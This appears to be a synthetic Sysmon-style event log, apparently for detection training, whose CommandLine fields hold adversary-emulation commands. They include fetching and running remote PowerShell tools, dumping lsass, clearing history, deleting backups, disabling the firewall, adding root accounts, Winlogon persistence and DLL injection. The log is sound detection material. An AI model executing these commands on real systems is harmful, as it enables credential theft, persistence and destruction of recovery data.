    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-01.campbell.biz",
        "User": "laura47",
        "ProcessID": 4478,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"if (-not (Test-Path #{dest_path})) {\\nNew-Item -Path #{dest_path} -ItemType Directory\\n} else {\\nWrite-Host \\\"Directory #{dest_path} already exists.\\\" }\\nCopy-Item -Path \\\"C:\\\\windows\\\\system32\\\\customshellhost.exe\\\" -Destination \\\"#{dest_path}\\\\customshellhost.exe\\\" -Force\\nCopy-Item -Path \\\"C:\\\\windows\\\\system32\\\\calc.exe\\\" -Destination \\\"#{dest_path}\\\\explorer.exe\\\" -Force\\n#{dest_path}\\\\customshellhost.exe\\n\",",
        "LogonID": 626639,
        "LogonGuid": "17b2265d-f1fb-4696-a4ad-d34c1d7110f0",
        "SourceProcessID": 2229,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\full..exe",
        "DestinationProcessID": 2340,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\account..exe",
        "UtcTime": "2024-05-17T01:36:51.702773Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-98.conley-burns.com",
        "User": "youngcarla",
        "ProcessID": 8691,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nSharpCloud -consoleoutput -noninteractive  \",",
        "LogonID": 696410,
        "LogonGuid": "db341ca7-4c10-49ca-a728-e799e8cfd6b2",
        "SourceProcessID": 6807,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\everyone..dll",
        "DestinationProcessID": 6371,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\would..dll",
        "UtcTime": "2024-05-17T01:36:51.702773Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-54.ray.net",
        "User": "valerie86",
        "ProcessID": 2958,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"if ((${#HISTIGNORE[@]})); then echo \\\"\\\\$HISTIGNORE = $HISTIGNORE\\\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \\\"\\\\$HISTIGNORE = $HISTIGNORE\\\"; fi\\n# -> $HISTIGNORE = ls*:rm*:ssh*\\nhistory -c \\nls -la $HISTFILE\\nls -la ~/.bash_logout\\nif [ $(history |wc -l) -eq 1 ]; then echo \\\"ls commands are not in history\\\"; fi\\n# -> ls commands are not in history\\nunset HISTIGNORE\\n\\nif ((${#HISTIGNORE[@]})); then echo \\\"\\\\$HISTIGNORE = $HISTIGNORE\\\"; else export HISTIGNORE='*'; echo \\\"\\\\$HISTIGNORE = $HISTIGNORE\\\"; fi\\n# -> $HISTIGNORE = *\\nhistory -c \\nwhoami\\ngroups\\nif [ $(history |wc -l) -eq 0 ]; then echo \\\"History cache is empty\\\"; fi\\n# -> History cache is empty\\n\",",
        "LogonID": 872539,
        "LogonGuid": "2a919365-0ff1-42ae-97a9-07c1eea1c10e",
        "SourceProcessID": 8614,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\animal..dll",
        "DestinationProcessID": 9752,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\former..dll",
        "UtcTime": "2024-05-17T01:36:51.702773Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-60.simpson.biz",
        "User": "rgilbert",
        "ProcessID": 8114,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"dir | clip\\necho \\\"T1115\\\" > %temp%\\\\T1115.txt\\nclip < %temp%\\\\T1115.txt\\n\",",
        "LogonID": 813812,
        "LogonGuid": "433714a3-c83c-4522-9f20-eaaf1dc9c90c",
        "SourceProcessID": 7664,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\bag..dll",
        "DestinationProcessID": 5030,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\group..exe",
        "UtcTime": "2024-05-17T01:36:51.702773Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-65.ramos.info",
        "User": "kpalmer",
        "ProcessID": 8250,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"$key= \\\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\Domains\\\\#{bad_domain}\\\\\\\"\\n$name =\\\"bad-subdomain\\\"\\nnew-item $key -Name $name -Force\\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\\n\",",
        "LogonID": 336088,
        "LogonGuid": "f48b240d-5686-4ef2-98c0-93458b51c042",
        "SourceProcessID": 1288,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\meeting..dll",
        "DestinationProcessID": 4195,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\represent..exe",
        "UtcTime": "2024-05-17T01:36:51.702773Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-86.madden.com",
        "User": "samueldunlap",
        "ProcessID": 1556,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"history -c\\n\",",
        "LogonID": 568088,
        "LogonGuid": "c3278dad-b847-4e3f-a147-fd1023d59e95",
        "SourceProcessID": 8020,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\together..exe",
        "DestinationProcessID": 7010,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\man..exe",
        "UtcTime": "2024-05-17T01:36:51.703774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-27.young-wilson.info",
        "User": "martinezrobin",
        "ProcessID": 8763,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"echo \\\"#{command}\\\" >> /var/spool/cron/crontabs/#{cron_script_name}\\n\",",
        "LogonID": 279784,
        "LogonGuid": "5f3957a8-4aec-40c0-9032-03fcef092df9",
        "SourceProcessID": 1945,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\act..dll",
        "DestinationProcessID": 6900,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\put..dll",
        "UtcTime": "2024-05-17T01:36:51.703774Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-20.reynolds-crawford.com",
        "User": "anthonypage",
        "ProcessID": 4128,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"\\\"#{exe_binary}\\\"\\n\",",
        "LogonID": 253225,
        "LogonGuid": "d2fc112f-3801-4e32-ba5b-e6efa0d20d9b",
        "SourceProcessID": 1619,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\production..exe",
        "DestinationProcessID": 4585,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\day..dll",
        "UtcTime": "2024-05-17T01:36:51.703774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-77.johnson.com",
        "User": "angelacarter",
        "ProcessID": 7305,
        "ProcessName": "nc.exe",
        "CommandLine": "\"pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account\\n\",",
        "LogonID": 218096,
        "LogonGuid": "3b095be0-9160-4cd4-b6e9-3e15fd325e96",
        "SourceProcessID": 7010,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\social..dll",
        "DestinationProcessID": 5937,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\article..dll",
        "UtcTime": "2024-05-17T01:36:51.703774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-96.gutierrez.org",
        "User": "chambersleah",
        "ProcessID": 9948,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"\\\"#{procdump_exe}\\\" -accepteula -ma lsass.exe #{output_file}\\n\",",
        "LogonID": 308417,
        "LogonGuid": "1874f095-a99d-487e-a2a4-40c0ca5ace72",
        "SourceProcessID": 1118,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\fill..exe",
        "DestinationProcessID": 3421,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\them..dll",
        "UtcTime": "2024-05-17T01:36:51.703774Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-30.ritter.com",
        "User": "vincent06",
        "ProcessID": 4786,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\\n\",",
        "LogonID": 663916,
        "LogonGuid": "025a6cf5-5b05-4def-bfc1-6498e5a84c48",
        "SourceProcessID": 4817,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\popular..dll",
        "DestinationProcessID": 1074,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\power..dll",
        "UtcTime": "2024-05-17T01:36:51.704774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-75.curry-clay.info",
        "User": "cody47",
        "ProcessID": 8134,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\\n\",",
        "LogonID": 245796,
        "LogonGuid": "80095f4c-3c70-4daf-bf47-9e8c18786167",
        "SourceProcessID": 6034,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\remember..exe",
        "DestinationProcessID": 9672,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\care..dll",
        "UtcTime": "2024-05-17T01:36:51.704774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-72.morales.org",
        "User": "williamsalex",
        "ProcessID": 5493,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PsExec.exe\\\" -accepteula \\\\\\\\#{target} -w c:\\\\ -c \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\rubeus.exe\\\" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\\nSet-Location \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\"\\nMove-Item -Force \\\"\\\\\\\\#{target}\\\\c$\\\\ticket.kirbi\\\" ticket.kirbi\\nWrite-Host \\\"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\\\"\\n& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\rubeus.exe\\\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\\nRemove-Item \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\ticket.kirbi\\\"\\n& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\rubeus.exe\\\" purge      \",",
        "LogonID": 577213,
        "LogonGuid": "3fd9dcad-2095-4c19-a5aa-ff99ba239284",
        "SourceProcessID": 3321,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\significant..dll",
        "DestinationProcessID": 2314,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\view..dll",
        "UtcTime": "2024-05-17T01:36:51.704774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-09.perez.net",
        "User": "ugray",
        "ProcessID": 9319,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\\n\",",
        "LogonID": 936317,
        "LogonGuid": "90eebf50-6183-45b4-8f76-547414beea20",
        "SourceProcessID": 3287,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\meet..dll",
        "DestinationProcessID": 1241,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\themselves..dll",
        "UtcTime": "2024-05-17T01:36:51.704774Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-32.walter-white.com",
        "User": "morrismelanie",
        "ProcessID": 4558,
        "ProcessName": "malware.exe",
        "CommandLine": "\"\\\"#{uacme_exe}\\\"\\n\",",
        "LogonID": 166533,
        "LogonGuid": "d5523399-ca77-4b5a-9d5f-d270caa8d895",
        "SourceProcessID": 3984,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\show..exe",
        "DestinationProcessID": 3993,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\role..exe",
        "UtcTime": "2024-05-17T01:36:51.704774Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-42.austin.biz",
        "User": "noahfloyd",
        "ProcessID": 7720,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$mypid = #{process_id}\\nmavinject $mypid /INJECTRUNNING \\\"#{dll_payload}\\\"\\nStop-Process -processname notepad\\n\",",
        "LogonID": 544976,
        "LogonGuid": "f9911f34-8714-4674-8cb2-a2e2bea1356f",
        "SourceProcessID": 5292,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\reach..exe",
        "DestinationProcessID": 4058,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\push..exe",
        "UtcTime": "2024-05-17T01:36:51.705774Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-23.armstrong-wood.info",
        "User": "veronicafrancis",
        "ProcessID": 7035,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}\",",
        "LogonID": 417101,
        "LogonGuid": "d011b302-dd4c-485e-bb50-c346940ae2e8",
        "SourceProcessID": 2358,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\which..dll",
        "DestinationProcessID": 7598,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\name..exe",
        "UtcTime": "2024-05-17T01:36:51.705774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-59.baker.info",
        "User": "nancyjohnson",
        "ProcessID": 9255,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"wmic cpu get name\\nwmic MEMPHYSICAL get MaxCapacity\\nwmic baseboard get product\\nwmic baseboard get version\\nwmic bios get SMBIOSBIOSVersion\\nwmic path win32_VideoController get name\\nwmic path win32_VideoController get DriverVersion\\nwmic path win32_VideoController get VideoModeDescription\\nwmic OS get Caption,OSArchitecture,Version\\nwmic DISKDRIVE get Caption\\nGet-WmiObject win32_bios\\n\",",
        "LogonID": 726994,
        "LogonGuid": "95c0ab77-1582-4863-97a0-ae2a2b13b2f3",
        "SourceProcessID": 1915,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\focus..exe",
        "DestinationProcessID": 5648,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\help..dll",
        "UtcTime": "2024-05-17T01:36:51.705774Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-90.mcbride-pacheco.com",
        "User": "zamorajoseph",
        "ProcessID": 7290,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"set -x\\nsudo kextload #{module_path}\\nkextstat 2>/dev/null | grep SoftRAID\\nsudo kextunload #{module_path}\\nsudo kmutil load -p #{module_path}\\nkextstat 2>/dev/null | grep SoftRAID\\nsudo kmutil unload -p #{module_path}\\n\",",
        "LogonID": 875793,
        "LogonGuid": "eb9ec7dd-38b6-4f02-b8b4-273224fc67bf",
        "SourceProcessID": 2006,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\hot..exe",
        "DestinationProcessID": 8903,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\state..exe",
        "UtcTime": "2024-05-17T01:36:51.705774Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-44.gates-moore.org",
        "User": "amberolsen",
        "ProcessID": 8975,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v DefaultUserName /t REG_SZ /d Administrator /f\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v DefaultPassword /t REG_SZ /d password1 /f\\n\",",
        "LogonID": 424548,
        "LogonGuid": "7dad13c5-bb96-4542-ba31-ac36c462bcf8",
        "SourceProcessID": 5978,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\cost..dll",
        "DestinationProcessID": 3129,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\much..exe",
        "UtcTime": "2024-05-17T01:36:51.705774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-16.peterson.com",
        "User": "angela98",
        "ProcessID": 9708,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\n$macrocode = \\\"   Open `\\\"#{jse_path}`\\\" For Output As #1`n   Write #1, `\\\"WScript.Quit`\\\"`n   Close #1`n   Shell`$ `\\\"cscript.exe #{jse_path}`\\\"`n\\\"\\nInvoke-MalDoc -macroCode $macrocode -officeProduct \\\"#{ms_product}\\\"\\n\",",
        "LogonID": 720121,
        "LogonGuid": "a465a8c6-9ec2-41ee-8692-2749c80fe417",
        "SourceProcessID": 8650,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\adult..exe",
        "DestinationProcessID": 3683,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\time..exe",
        "UtcTime": "2024-05-17T01:36:51.705774Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-49.yates.com",
        "User": "johnsonbrandon",
        "ProcessID": 3843,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"pw useradd #{username} -g 0 -d /root -s /bin/sh\\necho \\\"#{password}\\\" | pw usermod #{username} -h 0\\n\",",
        "LogonID": 373244,
        "LogonGuid": "84a4bbc9-c05e-44e0-a236-74826be04432",
        "SourceProcessID": 2787,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\go..exe",
        "DestinationProcessID": 9325,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\voice..dll",
        "UtcTime": "2024-05-17T01:36:51.707281Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-40.vasquez-mathis.com",
        "User": "xmcdonald",
        "ProcessID": 9942,
        "ProcessName": "malware.exe",
        "CommandLine": "\"sc.exe sdset scmanager D:(A;;KA;;;WD)\\n\",",
        "LogonID": 345227,
        "LogonGuid": "91dd65c5-1739-4c0e-96e2-b8f70ba22946",
        "SourceProcessID": 8843,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\drive..exe",
        "DestinationProcessID": 5680,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\book..dll",
        "UtcTime": "2024-05-17T01:36:51.707341Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-24.porter.org",
        "User": "hsanchez",
        "ProcessID": 5972,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"wbadmin delete catalog -quiet\\n\",",
        "LogonID": 210361,
        "LogonGuid": "0e2a8e63-90c3-4535-a774-764c0d191f3c",
        "SourceProcessID": 6096,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\serious..dll",
        "DestinationProcessID": 5320,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\country..dll",
        "UtcTime": "2024-05-17T01:36:51.707341Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-68.page.com",
        "User": "miranda85",
        "ProcessID": 7935,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\\nopenssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc \\ncat #{input_folder}/#{input_file}.enc | base64\",",
        "LogonID": 377080,
        "LogonGuid": "43303a36-630d-4994-9920-1e1af34574e7",
        "SourceProcessID": 5076,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\heart..dll",
        "DestinationProcessID": 3490,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\however..dll",
        "UtcTime": "2024-05-17T01:36:51.707341Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-72.whitehead-mcdonald.net",
        "User": "johndavidson",
        "ProcessID": 6372,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sc.exe stop #{service_name}\\n\",",
        "LogonID": 532746,
        "LogonGuid": "d53f0886-874f-4b1c-8485-23c26c4db29f",
        "SourceProcessID": 2906,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\result..exe",
        "DestinationProcessID": 4082,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\tell..exe",
        "UtcTime": "2024-05-17T01:36:51.708290Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-84.harrington.net",
        "User": "marcia89",
        "ProcessID": 4434,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Start-Process #{powershell_command}\\n\",",
        "LogonID": 287224,
        "LogonGuid": "5167404b-e7e3-4b54-94f1-1fa547073cdb",
        "SourceProcessID": 9183,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\account..dll",
        "DestinationProcessID": 4244,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\may..dll",
        "UtcTime": "2024-05-17T01:36:51.708290Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-61.goodman.com",
        "User": "jennifer41",
        "ProcessID": 3320,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Set-Location -path \\\"#{file_path}\\\\Sysinternals\\\";\\n./accesschk.exe -accepteula .;\\n\",",
        "LogonID": 389404,
        "LogonGuid": "9b136d4a-6301-41e4-8936-8879554dbfaa",
        "SourceProcessID": 3575,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\daughter..dll",
        "DestinationProcessID": 1143,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\view..exe",
        "UtcTime": "2024-05-17T01:36:51.708290Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-93.munoz.com",
        "User": "smithwilliam",
        "ProcessID": 1832,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sudo security add-trusted-cert -d -r trustRoot -k \\\"/Library/Keychains/System.keychain\\\" \\\"#{cert_filename}\\\"\\n\",",
        "LogonID": 404320,
        "LogonGuid": "edfad3c5-f770-4bce-a410-dbdfc838e17b",
        "SourceProcessID": 6757,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\challenge..dll",
        "DestinationProcessID": 9836,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\almost..dll",
        "UtcTime": "2024-05-17T01:36:51.708290Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-10.davis.com",
        "User": "laurie88",
        "ProcessID": 9946,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"ufw disable\\n\",",
        "LogonID": 150204,
        "LogonGuid": "4275da17-1ef7-4174-94da-0e0b7934a945",
        "SourceProcessID": 8250,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\feeling..exe",
        "DestinationProcessID": 9237,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\somebody..exe",
        "UtcTime": "2024-05-17T01:36:51.708290Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-39.king.info",
        "User": "dylan12",
        "ProcessID": 5646,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$oldvalue = $(Get-ItemPropertyValue -Path  \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name \\\"Shell\\\");\\nSet-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name \\\"Shell-backup\\\" -Value \\\"$oldvalue\\\";\\n$newvalue = $oldvalue + \\\", #{payload}\\\";\\nSet-ItemProperty -Path  \\\"HKLM:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name \\\"Shell\\\" -Value \\\"$newvalue\\\"\\n\",",
        "LogonID": 977523,
        "LogonGuid": "cad086d6-4b9b-40c6-a3f6-6d6ef88dadcf",
        "SourceProcessID": 6237,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\adult..dll",
        "DestinationProcessID": 9197,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\role..exe",
        "UtcTime": "2024-05-17T01:36:51.708290Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-95.martinez.biz",
        "User": "wrogers",
        "ProcessID": 3192,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"sudo insmod #{module_path}\\n\",",
        "LogonID": 335827,
        "LogonGuid": "3d467766-2e4f-41d7-9334-80d3244346c5",
        "SourceProcessID": 5277,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\others..exe",
        "DestinationProcessID": 4345,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\eat..dll",
        "UtcTime": "2024-05-17T01:36:51.709288Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-06.winters-bennett.com",
        "User": "ojones",
        "ProcessID": 8520,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"pw useradd #{username} -g 0 -d /root -s /bin/sh\\necho \\\"#{password}\\\" | pw usermod #{username} -h 0\\n\",",
        "LogonID": 518399,
        "LogonGuid": "b147f71e-8ad3-46f7-94a7-d0cb3506311c",
        "SourceProcessID": 5600,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\story..exe",
        "DestinationProcessID": 7605,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\yeah..dll",
        "UtcTime": "2024-05-17T01:36:51.709288Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-92.hopkins.com",
        "User": "kevinward",
        "ProcessID": 7655,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"copy %windir%\\\\system32\\\\certutil.exe %temp%\\\\tcm.tmp\\n%temp%\\\\tcm.tmp -encode #{executable} %temp%\\\\T1140_calc2.txt\\n%temp%\\\\tcm.tmp -decode %temp%\\\\T1140_calc2.txt %temp%\\\\T1140_calc2_decoded.exe\\n\",",
        "LogonID": 635069,
        "LogonGuid": "1e6551af-7ed4-461f-b93c-367542144589",
        "SourceProcessID": 2404,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\mission..dll",
        "DestinationProcessID": 1478,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\prove..dll",
        "UtcTime": "2024-05-17T01:36:51.709288Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-96.rodriguez.biz",
        "User": "sierra79",
        "ProcessID": 5792,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$PathToAtomicsFolder\\\\T1055.004\\\\bin\\\\x64\\\\EarlyBird.exe -program \\\"#{spawn_process_path}\\\" -debug\\n\",",
        "LogonID": 121944,
